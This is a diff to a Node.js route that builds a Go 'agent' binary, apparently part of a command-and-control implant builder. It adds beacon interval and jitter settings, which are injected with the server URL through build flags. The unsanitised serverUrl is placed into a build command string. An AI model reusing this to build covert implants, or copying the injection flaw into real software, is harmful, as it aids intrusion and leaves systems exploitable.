@@ -17,7 +17,7 @@ if (!fs.existsSync(PAYLOAD_DIR)) {
  * Triggers a Go build for a new agent
  */
 router.post('/generate', verifyToken, async (req, res) => {
-  const { serverUrl, showGui } = req.body;
+  const { serverUrl, showGui, interval = 10, jitter = 15 } = req.body;
 
   if (!serverUrl) {
     return res.status(400).json({ error: 'Server URL is required' });
@@ -30,9 +30,17 @@ router.post('/generate', verifyToken, async (req, res) => {
   // Path to the agent source
   const agentSourceDir = path.join(__dirname, '../../../agent');
   
+  // Calculate BeaconMax based on jitter %
+  // BeaconMin = interval
+  // BeaconMax = interval + (interval * jitter / 100)
+  const beaconMin = parseInt(interval);
+  const beaconMax = Math.ceil(beaconMin + (beaconMin * (parseInt(jitter) / 100)));
+
   // Construct the go build command
-  // We use ldflags to inject the serverUrl and debug status
+  // We use ldflags to inject config values
   let ldflags = `-X 'bytecode-agent/internal/config.DefaultServerURL=${serverUrl}'`;
+  ldflags += ` -X 'bytecode-agent/internal/config.DefaultBeaconMin=${beaconMin}'`;
+  ldflags += ` -X 'bytecode-agent/internal/config.DefaultBeaconMax=${beaconMax}'`;
   
   if (showGui) {
     ldflags += ` -X 'bytecode-agent/internal/config.DebugMode=true'`;
